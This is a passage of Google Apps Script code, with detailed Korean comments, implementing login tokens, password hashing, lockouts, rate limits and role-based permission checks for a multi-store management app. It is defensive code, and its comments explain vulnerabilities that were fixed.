}

/* 무인증 통과 기록. config.get은 앱을 열 때마다 오므로 매번 appendRow하면 체감 속도가 무너진다.
   명세 §3-3의 "성공한 읽기는 기록하지 않는다"와 "무인증 통과는 남긴다"의 절충으로
   액션별 10분에 1줄만 남긴다 — 이 표는 '누가 몇 번'이 아니라 '아직 무인증 경로가 살아 있다'를 보는 표다. */
function logBypass(action, code) {
  try {
    const key = 'abp:' + action;
    const cache = CacheService.getScriptCache();
    if (cache.get(key)) return;
    cache.put(key, '1', 600);
    auditLog(anonCtx(), action, '', '통과(무인증)', 'AUTH_BYPASS', String(code || ''));
  } catch (e) { }
}

/* ---------- 자격증명 (명세 §5) ---------- */

/* 사람이 옮겨 적을 수 있는 무작위 코드. 지금 쓰는 곳은 관리자 1회용 설정코드 하나뿐이다.
   혼동문자(0 O 1 l I)를 뺀 55자 알파벳. 12자면 12 × log2(55) ≈ 69비트.
   ★Math.random()은 예측 가능해 자격증명 생성에 쓰면 안 된다★
   ★UUID 문자열의 hex를 그대로 재료로 쓰지도 않는다★ — v4 UUID는 13번째 hex가 항상 '4',
   17번째가 8/9/a/b로 고정이라 그 자리에서 나오는 글자가 16종으로 줄고 분포가 치우친다.
   HMAC로 한 번 섞어 균일한 바이트를 얻고, 55의 배수(220) 이상은 버려 모듈로 편향도 없앤다. */
function randomCode(len) {
  const A = 'ABCDEFGHJKMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789'; // 55자
  const n = Math.max(8, Math.min(32, len || 12));
  let out = '';
  while (out.length < n) {
    const b = Utilities.computeHmacSha256Signature(Utilities.getUuid(), Utilities.getUuid());
    for (let i = 0; i < b.length && out.length < n; i++) {
      const v = (b[i] + 256) % 256;
      if (v >= 220) continue;              // 55 × 4 = 220
      out += A.charAt(v % 55);
    }
  }
  return out;
}

/* 바이트 배열을 hex로. ★(b+256)%256 보정 필수★ — 자바 byte는 부호가 있어
   보정을 빠뜨리면 문자열에 '-'가 섞여 영원히 불일치한다. */
function toHex(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i++) s += ('0' + ((bytes[i] + 256) % 256).toString(16)).slice(-2);
  return s;
}
function sha256Hex(str) {
  return toHex(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, str, Utilities.Charset.UTF_8));
}

/* 상수시간 비교. === 는 첫 불일치에서 조기 종료하므로 응답 시간으로 앞자리를 뽑아낼 수 있다. */
function ctEq(a, b) {
  const x = String(a == null ? '' : a);
  const y = String(b == null ? '' : b);
  if (x.length !== y.length) return false;
  let d = 0;
  for (let i = 0; i < x.length; i++) d |= (x.charCodeAt(i) ^ y.charCodeAt(i));
  return d === 0;
}

/* 앱스 스크립트에는 PBKDF2·bcrypt·scrypt가 없다. SHA-256 반복이 유일한 선택지다.
     h = SHA256(솔트|원문|페퍼);  N-1회:  h = SHA256(h|솔트) */
function pwHash(salt, plain, iter) {
  const pepper = prop('PW_PEPPER', '');
  let h = sha256Hex(String(salt) + '|' + String(plain) + '|' + pepper);
  const n = Math.max(1, iter | 0);
  for (let i = 1; i < n; i++) h = sha256Hex(h + '|' + String(salt));
  return h;
}

/* 비밀번호 최소 요건. 관리자가 26곳 몫을 정해 주는 구조라 규칙은 하나로 통일한다
   (accounts.html의 [비밀번호 설정]과 매장 본인 변경이 같은 함수를 쓴다).
   ★복잡도 규칙을 세우지 않는다★ — 대문자·특수문자를 강제하면 담당자가 26개를 지어내다
   'Glow2026!' 같은 한 벌을 돌려쓰게 된다. 길이만 요구하고 나머지는 사람에게 맡긴다.
   빈 문자열이면 '' 대신 안내 문구를 돌려준다(호출부가 그대로 사용자에게 보여 준다). */
function pwWeak(pw, id) {
  const s = String(pw == null ? '' : pw);
  if (s.length < 8) return '비밀번호는 8자 이상이어야 합니다.';
  if (s.length > 100) return '비밀번호가 너무 깁니다 (100자 이내).';
  if (id && normId(s) === normId(id)) return '아이디와 다른 비밀번호를 정해 주세요.';
  if (s !== s.trim()) return '비밀번호의 앞뒤 공백은 사용할 수 없습니다.';
  return '';
}

/* 관리자 1회용 설정코드 — 평문은 어디에도 저장하지 않는다. 속성에는 해시와 만료시각만. */
function setupCodeHash(code) { return sha256Hex('setup|' + String(code) + '|' + prop('PW_PEPPER', '')); }

/* ★설정코드는 발급 대상 계정에 묶여 있어야 한다★
   종전에는 속성에 해시와 만료뿐이라 아이디가 전적으로 payload.id에서 왔다. 그러면 설정코드를
   아는 사람이 {"id":"st1a2b3c4d", …}로 임의 매장 계정의 비밀번호를 덮어쓸 수 있고, 그 계정의
   cf가 바뀌어 해당 매장의 살아 있는 토큰이 전부 죽는다(서비스 거부 + 계정 탈취).
   ※id가 없는 옛 속성은 'admin'용으로 본다(발급 함수가 admin 전용이었다). */
function checkSetupCode(code, id) {
  const rawProp = prop('ADMIN_SETUP', '');
  if (!rawProp || !code) return false;
  let obj;
  try { obj = JSON.parse(rawProp); } catch (e) { return false; }
  if (!obj || !obj.h || !obj.exp) return false;
  if (Date.now() > Number(obj.exp)) return false;
  const forId = normId(obj.id || 'admin');
  if (forId !== normId(id)) return false;
  return ctEq(obj.h, setupCodeHash(code));
}

/* 지금 이 아이디 앞으로 살아 있는 설정코드가 있는가 (코드 자체는 보지 않는다).
   ★잠금 카운터를 올려도 되는 순간인지를 판정하는 데만 쓴다★ — 맞힐 비밀이 없는데
   "자격증명 실패"로 세면, 인증 없이 남의 계정을 잠그는 수단이 된다 (fnSetPassword 참조).
   issueAdminSetupCode()를 돌린 뒤 24시간 동안만 참이다. */
function setupCodeOutstanding(id) {
  const rawProp = prop('ADMIN_SETUP', '');
  if (!rawProp) return false;
  let obj;
  try { obj = JSON.parse(rawProp); } catch (e) { return false; }
  if (!obj || !obj.h || !obj.exp) return false;
  if (Date.now() > Number(obj.exp)) return false;
  return normId(obj.id || 'admin') === normId(id);
}

/* ---------- 토큰 (명세 §5-2·5-3) ---------- */

/*  v1.<base64url(payloadJSON)>.<base64url(HMAC_SHA256("v1." + payloadB64, TOKEN_KEY))>
    ★서명 대상은 "v1." + payload_b64 전체★ — 버전 접두사를 서명에서 빼면 다운그레이드 여지가 생긴다.
    payload: { v, u(아이디), cf(자격증명 지문), iat, exp }
    역할·매장범위·메뉴를 굽지 않는다. 시트를 고치면 60초 안에 반영되고, 서명이 뚫려도
    공격자가 얻는 것은 "존재하는 어떤 아이디"뿐이며 권한은 여전히 시트가 결정한다.
    슬라이딩 갱신도 만들지 않는다 — 절대 상한이 없어 탈취 토큰이 영구화된다. */
function b64u(bytes) { return Utilities.base64EncodeWebSafe(bytes).replace(/=+$/, ''); }
function b64uText(str) { return Utilities.base64EncodeWebSafe(str, Utilities.Charset.UTF_8).replace(/=+$/, ''); }
function b64uDecode(str) {
  let s = String(str);
  while (s.length % 4 !== 0) s += '=';
  return Utilities.newBlob(Utilities.base64DecodeWebSafe(s)).getDataAsString('UTF-8');
}
function hmacB64(msg, key) {
  return b64u(Utilities.computeHmacSha256Signature(String(msg), String(key)));
}

/* 자격증명 지문 = 비밀번호 해시의 HMAC 앞 8자.
   ★강제 로그아웃 3수단 중 ①이 이것이다★ — 비밀번호를 바꾸면 H열 해시가 달라지고,
   따라서 cf가 달라져 그 계정으로 발급된 기존 토큰이 계정 캐시 60초 안에 전부 죽는다
   (writeCredential이 dropAccountCache를 부르므로 실제로는 즉시).
   세션이 무기한이 된 뒤로 이 성질이 특히 중요해졌다 — 기기를 잃어버렸을 때 담당자가
   할 수 있는 일은 '비밀번호를 다시 설정한다' 하나이고, 그것만으로 끝나야 한다.
   ※해시가 비어 있는(비밀번호 미설정) 계정은 애초에 로그인할 수 없으므로 토큰도 없다. */
function credFingerprint(acct) {
  const key = prop('TOKEN_KEY', '');
  if (!key) return '';
  return hmacB64('p:' + String(acct.hash || ''), key).slice(0, 8);
}

/* 무기한 세션(확정사항 4). exp를 없애지 않고 10년 뒤로 두는 이유는 토큰 형식과 검증 코드
   (4단계 만료 검사·프론트의 skew 보정)를 한 줄도 바꾸지 않기 위해서다. 체감상 무기한이고,
   '만료가 없는 토큰'이라는 특수 케이스를 코드에 만들지 않는다.
   대신 강제 로그아웃 3수단이 안전장치 전부다: ①비밀번호 변경(cf) ②상태 중지 ③TOKEN_MINV +1. */
const TOKEN_TTL_H_DEFAULT = 87600;   // 10년

/* ★비상 로그아웃 스위치의 실제 값 — verifyToken·signToken 양쪽이 이 함수만 쓴다★
   종전에는 두 곳에서 propN('TOKEN_MINV', 1)을 직접 읽었는데, 거기에 함정이 둘 있었다.

   ① ★오타가 '안 켜짐' 쪽으로 넘어간다★ — propN은 Number()가 NaN이면 기본값 1을 쓴다.
      'v2'·'２'(전각)·'2회'를 넣으면 전부 조용히 1이 되어 ★비상 로그아웃이 아무 일도 하지
      않는다★. 오류도 로그도 없다. enforceOn()은 오타를 '켜짐' 쪽으로 넘기도록 일부러 고쳐
      놨는데(169행) 정작 비상 스위치인 이쪽만 반대 방향이었다. 여기서는 해석 불가를
      '지금까지 올려 둔 값 유지'로 처리한다 — 스위치를 끄는 방향으로는 절대 넘어가지 않는다.
   ② ★되돌리면 죽은 토큰이 되살아난다★ — 2로 올렸다가 속성을 지우거나 1로 낮추면
      앞서 폐기한 v1 토큰이 전부 다시 유효해진다. 분실 기기를 끊으려고 누른 스위치가
      나중에 조용히 풀리는 셈이다. 최고값(HWM)을 따로 적어 두고 되돌아가지 못하게 한다
      (정말 내려야 하면 편집기에서 TOKEN_MINV_HWM 속성을 함께 지운다 — 의도가 필요한 일이다). */
function tokenMinV() {
  const raw = String(prop('TOKEN_MINV', '1')).trim();
  const hwm = Number(PROPS.getProperty('TOKEN_MINV_HWM') || 1) || 1;
  const n = Math.floor(Number(raw));
  if (!isFinite(n) || n < 1) return hwm;   // 해석 불가 → 가장 안전한 쪽
  if (n > hwm) { try { PROPS.setProperty('TOKEN_MINV_HWM', String(n)); } catch (e) { } }
  return Math.max(n, hwm);
}

function signToken(acct) {
  const key = prop('TOKEN_KEY', '');
  if (!key) return null;
  const now = Math.floor(Date.now() / 1000);
  const exp = now + Math.round(propN('TOKEN_TTL_H', TOKEN_TTL_H_DEFAULT) * 3600);
  /* ★v를 1로 하드코딩하지 않는다★ — 하드코딩하면 TOKEN_MINV를 2로 올리는 순간 기존 토큰뿐
     아니라 그 뒤 새로 발급되는 토큰까지 전부 AUTH_INVALID가 된다(로그인은 성공하는데 이어지는
     모든 요청이 거부되고, 코드를 고쳐 재배포하기 전까지 복구가 불가능하다).
     발급 버전을 현재 TOKEN_MINV에 맞추면 그때 비로소 "전원 강제 로그아웃 스위치"가 된다. */
  const payload = { v: tokenMinV(), u: acct.id, cf: credFingerprint(acct), iat: now, exp: exp };
  const bodyB64 = 'v1.' + b64uText(JSON.stringify(payload));
  return { token: bodyB64 + '.' + hmacB64(bodyB64, key), exp: exp };
}

/* 5단계 검증. 4단계의 실제 사유(ACCOUNT_DISABLED·CRED_CHANGED)는 감사로그에만 남기고
   응답에는 담지 않는다 — 응답에 담으면 계정 상태를 캐묻는 오라클이 된다. */
function verifyToken(token) {
  const bad = { ok: false, code: 'AUTH_INVALID', msg: '로그인이 필요합니다.' };
  const t = String(token || '');
  if (!t) return { ok: false, code: 'AUTH_REQUIRED', msg: '로그인이 필요합니다.' };
  // 1 형식
  if (t.length > 512 || t.indexOf('v1.') !== 0 || t.split('.').length !== 3) return bad;
  const parts = t.split('.');
  const key = prop('TOKEN_KEY', '');
  if (!key) return bad; // 키가 없으면 어떤 토큰도 신뢰하지 않는다 (fail-closed)
  // 2 서명 (상수시간)
  if (!ctEq(parts[2], hmacB64(parts[0] + '.' + parts[1], key))) return bad;
  // 3 payload
  let p;
  try { p = JSON.parse(b64uDecode(parts[1])); } catch (e) { return bad; }
  if (!p || Number(p.v || 0) < tokenMinV()) return bad;
  const now = Math.floor(Date.now() / 1000);
  if (!p.exp || Number(p.exp) <= now) return { ok: false, code: 'AUTH_EXPIRED', msg: '로그인이 만료되었습니다. 다시 로그인해 주세요.' };
  // 4 계정 조회 (캐시 60초)
  /* ★강제 로그아웃 3수단이 전부 이 4단계에 있다★
       ② 상태가 '사용'이 아니면 거부  (계정 탭 E열 또는 account.setStatus)
       ① cf 불일치면 거부            (비밀번호 변경)
       ③ 위 3단계의 p.v < TOKEN_MINV 검사 (전원 강제 로그아웃)
     셋 다 '토큰을 폐기하는 목록'이 아니라 '지금 시트를 다시 읽어 판정한다'로 되어 있어서,
     무기한 세션이어도 담당자가 시트 한 칸을 고치면 60초 안에 실제로 끊긴다. */
  const acct = getAccount(normId(p.u));
  if (!acct) return bad;
  if (acct.status !== STATUS_ON) {
    auditLog({ id: acct.id, role: acct.role }, 'auth.verify', '', '거부', 'ACCOUNT_DISABLED', '');
    return bad;
  }
  if (!ctEq(String(p.cf || ''), credFingerprint(acct))) {
    auditLog({ id: acct.id, role: acct.role }, 'auth.verify', '', '거부', 'CRED_CHANGED', '');
    return bad;
  }
  touchSeen(acct);
  // 5 ctx — 전부 시트에서 온 값이다. 토큰에서 온 것은 u 뿐이다
  return { ok: true, ctx: acctToCtx(acct) };
}

function acctToCtx(acct) {
  return { auth: true, id: acct.id, name: acct.name, role: acct.role, stores: scopeOf(acct) };
}

/* 무인증 컨텍스트 — AUTH_ENFORCE='off'인 동안의 옛 경로와 익명 액션이 쓴다.
   role이 ''이라 can()은 전부 거짓이 되고, stores가 비어 있어 매장 데이터에 닿을 수 없다. */
function anonCtx() {
  return { auth: false, id: '(무인증)', name: '', role: '', stores: { all: false, list: [] } };
}

/* 매장범위는 `계정` D열 하나가 정한다. '*'=전체.
   지역담당은 역할을 추가하지 않는다 — D열에 매장 3곳을 적을 뿐이고 코드는 한 줄도 바뀌지 않는다. */
function scopeOf(acct) {
  const raw = String(acct.scope || '').trim();
  if (raw === '*') return { all: true, list: displayStores() };
  const list = [];
  raw.split(',').forEach(function (s) {
    const n = normStore(s);
    if (n && list.indexOf(n) < 0) list.push(n);
  });
  return { all: false, list: list };
}

/* ---------- 잠금 · 레이트리밋 · 쿼터 방어 (명세 §6) ---------- */

/* ① 해시 예산 — 시간당 HASH_BUDGET(60) 초과 시 해시를 '돌리지 않고' LOCKED.
   1.5초짜리 해시는 요청 1건(수 ms)으로 서버 1.5초를 태우는 증폭 공격이고, 일일 90분 쿼터가
   실공격 2~3분에 소진되어 26곳 전체가 24시간 멈춘다. 쿼터 소진을 '로그인 일시 장애'로 격하시킨다. */
function hourKey(prefix) {
  return prefix + Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyyMMddHH');
}
function bumpHourly(prefix) {
  const k = hourKey(prefix);
  const cur = Number(PROPS.getProperty(k) || 0) + 1;
  PROPS.setProperty(k, String(cur));
  if (cur === 1) {
    // 지난 시간대 키가 쌓이지 않게 정리 (속성은 durable이라 스스로 사라지지 않는다)
    const prev = new Date(Date.now() - 3600000);
    const prev2 = new Date(Date.now() - 7200000);
    const tz = Session.getScriptTimeZone();
    try { PROPS.deleteProperty(prefix + Utilities.formatDate(prev, tz, 'yyyyMMddHH')); } catch (e) { }
    try { PROPS.deleteProperty(prefix + Utilities.formatDate(prev2, tz, 'yyyyMMddHH')); } catch (e) { }
  }
  return cur;
}
function hourlyCount(prefix) { return Number(PROPS.getProperty(hourKey(prefix)) || 0); }

/* ★전역 예산 하나만 두면 그것이 곧 '전원 로그인 차단 버튼'이 된다★
   종전에는 시간당 전역 60회였다. 익명 스로틀(분 20)에 여유롭게 들어가는 속도로 아무 아이디에
   아무 비밀번호를 60번 보내면 그 시각 동안 ★관리자를 포함한 전원이 LOCKED★를 받았다.
   매시 3분만 투자하면 영구 차단이고, 인증도 필요 없다. 1234행 주석이 "입구에서 GBLK를
   검사하지 않는 이유"로 적어 둔 바로 그 사고를 다른 이름으로 다시 만든 셈이었다.
   운영상으로도 60은 좁았다 — 설치 당일 26곳 비밀번호 설정(26) + 그날 저녁 첫 로그인(26)만으로
   52회다. 오타 재시도 몇 번이면 나머지 매장이 "방금 받은 비밀번호로 안 들어가진다"가 된다.

   그래서 두 겹으로 나눈다.
     ·아이디별(HASH_BUDGET_ID, 기본 12/시간) — ★실제 브레이크는 이쪽이다★. 공격자는 반드시
       어떤 아이디를 써야 하고, 그 아이디는 10회 실패에 15분 잠긴다. 남을 막지 못한다.
       ★반드시 LOGIN_FAIL_MAX(10)보다 커야 한다★ — 작게 두면 계정 잠금(15분)보다 이 예산이
       먼저 걸려, 비밀번호를 몇 번 틀린 매장에게 "15분"이 아니라 "60분"이 안내된다.
       설계상 사용자에게 보여야 하는 것은 잠금 쪽이다.
     ·전역(HASH_BUDGET, 기본 300/시간) — 쿼터 소진만 막는 마지막 그물. 그리고 전역이
       소진되어도 ★최근 실패 카운터가 0인 아이디는 통과시킨다★ — 공격자가 태운 예산 때문에
       정상 사용자가 못 들어가는 일을 없앤다.
   아이디별 카운터는 CacheService에 둔다(PropertiesService에 두면 키가 아이디×시간만큼
   durable하게 쌓인다 — photoQuotaOk에서 실제로 겪은 문제다). 축출되면 헐거워지지만
   막으려는 것은 '수백 회'이고, 잠금은 그대로 살아 있다. */
function hbIdKey(id) {
  return 'hb:' + String(id || '?').slice(0, 60) + ':' + Math.floor(Date.now() / 3600000);
}
function hashBudgetOk(id) {
  const cache = CacheService.getScriptCache();
  if (id) {
    const per = Number(cache.get(hbIdKey(id)) || 0);
    if (per >= propN('HASH_BUDGET_ID', 12)) return false;
  }
  if (hourlyCount('HB:') < propN('HASH_BUDGET', 300)) return true;
  /* 전역 소진 — 최근 실패가 없는 아이디만 통과시킨다(공격자의 아이디는 lf: 카운터가 올라 있다) */
  if (!id) return false;
  try { return Number(cache.get('lf:' + id) || 0) === 0; } catch (e) { return false; }
}
function hashBudgetUse(id) {
  bumpHourly('HB:');
  if (!id) return;
  try {
    const cache = CacheService.getScriptCache();
    const k = hbIdKey(id);
    cache.put(k, String(Number(cache.get(k) || 0) + 1), 3700);
  } catch (e) { }
}

/* ② 계정별 잠금 — 카운터는 CacheService(싸고 손실 허용), 잠금 상태는 PropertiesService(durable).
   캐시는 메모리 압박 시 축출되고 공격자가 축출을 유발할 수 있다. 드문 이벤트는 durable 저장소에. */
function lockCheck(id) {
  const until = Number(PROPS.getProperty('LK:' + id) || 0);
  if (until > Date.now()) {
    return { locked: true, retryAfterMin: Math.max(1, Math.ceil((until - Date.now()) / 60000)) };
  }
  return { locked: false };
}
function lockFail(id) {
  const cache = CacheService.getScriptCache();
  const k = 'lf:' + id;
  /* LockService를 쓰지 않는다 — read-modify-write라 몇 회 누락될 수 있지만, 무차별 대입은
     수천 회 시도이므로 10회가 13회로 새는 것은 무의미하고 정상 로그인을 느리게 만들 이유가 없다. */
  const n = Number(cache.get(k) || 0) + 1;
  cache.put(k, String(n), 600);
  if (n >= propN('LOGIN_FAIL_MAX', 10)) {
    PROPS.setProperty('LK:' + id, String(Date.now() + 15 * 60000));
    cache.remove(k);
    return true;
  }
  return false;
}
function lockClear(id) {
  try { PROPS.deleteProperty('LK:' + id); } catch (e) { }
  try { CacheService.getScriptCache().remove('lf:' + id); } catch (e) { }
}

/* ③ 전역 실패 카운터.
   ★"아이디를 바꿔가며 ②를 우회하는 공격을 막는다"고 적혀 있었지만 사실이 아니다★ —
   globalBlocked()는 loginFail 안에서만 읽히므로, 이 값이 하는 일은 ★이미 실패한 사람의 응답
   문구를 바꾸는 것★뿐이고 아무 요청도 차단하지 않는다. 입구에서 검사하면 그 순간
   "아무 문자열이나 40번 = 전원 로그인 차단"이 되므로(1234행) 일부러 차단하지 않는 것이 맞다.
   실제 브레이크는 hashBudget(아이디별 8/시간)과 계정별 잠금(10회 → 15분)이다.
   이 카운터는 '지금 무차별 대입이 진행 중이다'를 감사로그 한 줄로 알리는 경보에 가깝다. */
function globalBlocked() {
  const until = Number(PROPS.getProperty('GBLK') || 0);
  if (until > Date.now()) return Math.max(1, Math.ceil((until - Date.now()) / 60000));
  return 0;
}
/* ★`n === MAX`가 아니라 `n >= MAX`★ — 정확히 일치할 때만 발동하면 41번째부터 재무장되지 않아,
   매시 정각에 40건씩만 보내면 매시간 30분 정지를 영구히 유지할 수 있었다.
   경보 감사로그는 '차단이 걸리지 않은 상태 → 걸린 상태'로 넘어갈 때만 남긴다
   (매 실패마다 남기면 공격 중에 시트 쓰기가 폭주한다). */
function globalFail() {
  const n = bumpHourly('GF:');
  if (n >= propN('GLOBAL_FAIL_MAX', 40)) {
    const wasBlocked = globalBlocked() > 0;
    PROPS.setProperty('GBLK', String(Date.now() + 30 * 60000));
    if (!wasBlocked) {
      auditLog(anonCtx(), 'auth.login', '', '경보', 'GLOBAL_THROTTLE', '시간당 로그인 실패 상한 초과');
    }
  }
}

/* ④ 인증 후 레이트리밋 — 분당 30요청 */
function rateLimit(id) {
  const bucket = Math.floor(Date.now() / 60000);
  const k = 'rl:' + id + ':' + bucket;
  const cache = CacheService.getScriptCache();
  const n = Number(cache.get(k) || 0) + 1;
  cache.put(k, String(n), 120);
  if (n > 30) return err('RATE_LIMITED', '요청이 많습니다. 잠시 후 다시 시도해 주세요.');
  return { ok: true };
}

/* 익명 액션 스로틀. 명세가 임계값을 정하지 않아 아래 값으로 둔다 —
   실제 고객 설문은 매장당 월 몇 건 규모이므로 넉넉하고, 자동화 도구는 즉시 걸린다.
   ★버킷을 kind로 나눈다★ — 종전에는 auth.login·auth.setPassword·survey.submit이 한 바구니를
   써서, 공개된 설문지를 시간당 200건 제출하는 것만으로 전 계정 로그인이 RATE_LIMITED가 됐다
   (반대로 설문이 몰리는 날에는 담당자가 로그인하지 못했다). 설문지 링크 하나가
   '전원 로그인 차단 버튼'이 되지 않도록 계열을 물리적으로 분리한다. */
const ANON_LIMIT = {
  anon: { min: 40, hour: 200, mk: 'an:', hk: 'AN:' },   // 고객 설문
  auth: { min: 20, hour: 300, mk: 'al:', hk: 'AL:' }    // 로그인·비밀번호 설정
};
function anonThrottle(kind) {
  const c = ANON_LIMIT[kind] || ANON_LIMIT.anon;
  /* ★분당 상한만 스크립트 속성으로 뺀다 (ANON_MIN_AUTH / ANON_MIN_ANON)★
     26곳에 카톡으로 비밀번호를 일괄 공지하면 같은 1분 안에 로그인이 몰린다. auth 버킷은
     분당 20이라 21번째부터 "요청이 많습니다"가 뜨는데, 매장 눈에는 그것이 "방금 받은
     비밀번호가 안 된다"로만 보인다. 평소 값은 그대로 두고(기본값 = 종전 상수), 배포 당일에만
     속성 화면에서 잠깐 올렸다가 되돌릴 수 있게 한다 — 재배포가 필요 없어야 저녁에 쓸 수 있다.
     ※시간당 상한(c.hour)은 빼지 않는다. 하루치 실수를 흡수하는 것이 그쪽의 역할이고,
       분당만 열어도 "공지가 한꺼번에 나갔다"는 상황은 전부 넘어간다.
     ※그래도 공지를 3개 조로 10분 간격에 나눠 보내는 편이 먼저다. 이것은 그게 안 됐을 때의 손잡이다. */
  const perMin = propN(kind === 'auth' ? 'ANON_MIN_AUTH' : 'ANON_MIN_ANON', c.min);
  const k = c.mk + Math.floor(Date.now() / 60000);
  const cache = CacheService.getScriptCache();
  const n = Number(cache.get(k) || 0) + 1;
  cache.put(k, String(n), 120);
  if (n > perMin) return err('RATE_LIMITED', '요청이 많습니다. 잠시 후 다시 시도해 주세요.');
  if (hourlyCount(c.hk) >= c.hour) return err('RATE_LIMITED', '요청이 많습니다. 잠시 후 다시 시도해 주세요.');
  bumpHourly(c.hk);
  return { ok: true };
}

/* 레거시 무인증 우회(AUTH_ENFORCE='off' + 옛 봉투) 전용 스로틀.
   ★PropertiesService가 아니라 CacheService만 쓴다★ — 이 경로에는 앱을 열 때마다 오는
   config.get이 포함되므로, 요청마다 durable 쓰기를 붙이면 가장 뜨거운 경로가 느려진다.
   캐시가 축출되면 카운터가 헐거워지지만, 막으려는 것이 '수천 건'이라 그 정도 손실은 무해하다.
   임계값 근거: 26곳 × 하루 몇 회 열기 + 월말 제출이 실사용 규모다. 분 120 / 시간 600이면
   실업무는 절대 닿지 않고, 12MB 제출 반복으로 일일 90분 쿼터를 태우는 공격은 막힌다. */
function legacyThrottle() {
  const cache = CacheService.getScriptCache();
  const mk = 'lgm:' + Math.floor(Date.now() / 60000);
  const nm = Number(cache.get(mk) || 0) + 1;
  cache.put(mk, String(nm), 120);
  if (nm > 120) return err('RATE_LIMITED', '요청이 많습니다. 잠시 후 다시 시도해 주세요.');
  const hk = 'lgh:' + Math.floor(Date.now() / 3600000);
  const nh = Number(cache.get(hk) || 0) + 1;
  cache.put(hk, String(nh), 3700);
  if (nh > 600) return err('RATE_LIMITED', '요청이 많습니다. 잠시 후 다시 시도해 주세요.');
  return { ok: true };
}

/* ---------- 권한 게이트 (명세 §8-2·8-3) ---------- */

/* can(역할, 메뉴, 동작) → {allow}
   ★이 함수는 역할 이름을 비교하지 않고 메뉴 키의 의미도 모른다. 문자열 조인만 한다★
   role === '관리자' 같은 비교가 서버 코드 어디에 한 줄이라도 있으면 설계 위반이다 —
   지역담당·팀장이 생기는 날 조용히 깨질 자리다.

   행 선택 규칙:
     1. (역할, 메뉴) 정확 일치 행이 있으면 그 행만 적용
     2. 없으면 (역할, *) 행
     3. 둘 다 없으면 거부
     4. 정확 일치가 2행 이상이면 교집합(가장 제한적인 값)을 취하고 ROLE_TABLE_DUP 경고.
        합집합도 "위쪽 행 채택"도 아니다 — 둘 다 시트 오타가 권한 확대로 이어지는 방향이다.

   ★`*` 폴백의 유일한 위험★: 누가 `매장담당자 | * | ○` 를 한 줄 복사해 넣으면 그 순간 26개
   매장 계정이 계정 관리(ADMIN_MENU)·감사로그·미제출 현황판까지 전부 읽게 된다.

   ★2026-08-16 — 그 한 줄을 조건부로 막는다 (지시 §4 "매장 사람이 관리자 화면에 절대 못 들어오게")★
   종전에는 막지 않았다. 이유는 "`관리자 | accounts` 행이 아직 없는(옛 시드로 만들어진) 시트에서는
   폴백 금지가 담당자 본인을 잠그고, 복구는 편집기에서 시트를 직접 고치는 것뿐"이라는 것이었다.
   그 우려는 **조건을 붙이면 사라진다** — 표 안에 (누구든) `accounts` 정확일치 행이 하나라도
   있으면 "계정 관리는 이 역할에 준다"를 사람이 이미 적어 둔 것이므로, 그때부터는 `*` 폴백을
   받지 않는다. 행이 하나도 없는 옛 시트에서는 종전 그대로 폴백해 담당자가 잠기지 않는다.
   지금 시드는 `관리자 | accounts` 행을 명시적으로 넣으므로(아래 ensureAuthSheets) 새 시트는
   전부 보호되고, 옛 시트도 그 한 줄을 손으로 추가하는 순간 보호된다.
   같은 규칙을 'debug'(오류 원문 열람)에도 적용한다 — 시트 오타 하나로 파일 ID·시트명이
   실린 예외 문자열이 매장 화면까지 흘러가는 경로를 함께 닫는다.

   ★그래서 앞으로 새 역할에 계정 관리를 주려면 `*` 한 줄로는 안 된다★
   `새역할 | accounts | ○ | ○` 처럼 메뉴 키를 적어야 한다. 이 규칙은 항상 '덜 주는' 쪽으로만
   틀리므로(주려던 것을 못 주는 일은 시트 한 줄로 즉시 고쳐지고, 주지 말아야 할 것을 주는 일은
   26개 매장이 관리자 화면을 얻은 뒤에야 발견된다) 이 방향을 택했다.
   ※이것은 오타 방어이지 권한 설계가 아니다. 정본은 여전히 `역할` 탭이다. */
function noStarMenu(menu) { return menu === ADMIN_MENU || menu === 'debug'; }

function can(role, menu, act) {
  if (!role || !menu) return { allow: false };
  const rows = getRoles();
  const exact = [];
  const star = [];
  let declared = false;   // 표 어딘가에 (어느 역할이든) 이 메뉴의 정확일치 행이 있는가
  for (let i = 0; i < rows.length; i++) {
    if (rows[i].menu === menu) declared = true;   // ★역할 필터보다 먼저★ — 다른 역할의 행도 센다
    if (rows[i].role !== role) continue;
    if (rows[i].menu === menu) exact.push(rows[i]);
    else if (rows[i].menu === '*') star.push(rows[i]);
  }
  let use = exact;
  /* 정확일치가 없을 때만 `*`로 넘어간다. 단 위 ★의 두 메뉴는 '표에 이미 적혀 있으면' 넘어가지 않는다. */
  if (!use.length && !(noStarMenu(menu) && declared)) use = star;
  if (!use.length) return { allow: false };
  if (exact.length > 1) {
    auditLog({ id: '(시스템)', role: role }, 'role.table', '', '경고', 'ROLE_TABLE_DUP',
      '역할 탭에 (' + role + ', ' + menu + ') 행이 ' + exact.length + '개');
  }
  let read = true, write = true;
  for (let j = 0; j < use.length; j++) { // 교집합
    read = read && use[j].read;
    write = write && use[j].write;
  }
  if (act === '쓰기') return { allow: !!write };
  if (act === '읽기') return { allow: !!read };
  return { allow: !!(read || write) };
}

/* 매장명 정규화 — 전 구간에서 이 함수 하나만 쓴다.
   macOS에서 입력된 한글은 NFD(자모 분리)일 수 있어 눈에 같아 보여도 문자열이 다르다.
   매장명이 '계정 D열 · 통합시트 D열 · 매장 파일'에서 일치해야 하므로 정규화는 필수. */
function normStore(s) {
  return String(s == null ? '' : s).normalize('NFC').trim().replace(/\s+/g, ' ');
}

/* 남의 매장 차단의 유일한 지점 (명세 §8-3).
   list.length===1 에서 "requested가 목록에 없으면 거부"가 아니라 "requested를 아예 안 본다"로
   짠 것이 핵심이다 — 검사문을 빠뜨릴 수 있는 코드 대신, 검사할 값이 존재하지 않는 코드를 만든다. */
function resolveTarget(ctx, scope, payload) {
  if (scope === 'none') return { ok: true, target: null };   // payload.store를 무시하고 버린다
  const st = ctx.stores || { all: false, list: [] };
  if (scope === 'list') return { ok: true, target: st.all ? null : st.list.slice(0) };
  if (scope !== 'target') return { ok: true, target: null };

  const requested = normStore(payload && payload.store);
  if (st.all) {
    if (!requested) return { ok: false, code: 'BAD_REQUEST', msg: '매장을 선택해 주세요.', requested: '' };
    const all = displayStores();
    if (all.indexOf(requested) < 0) {
      return { ok: false, code: 'BAD_REQUEST', msg: '매장을 찾을 수 없습니다.', requested: requested };
    }
    return { ok: true, target: requested };
  }
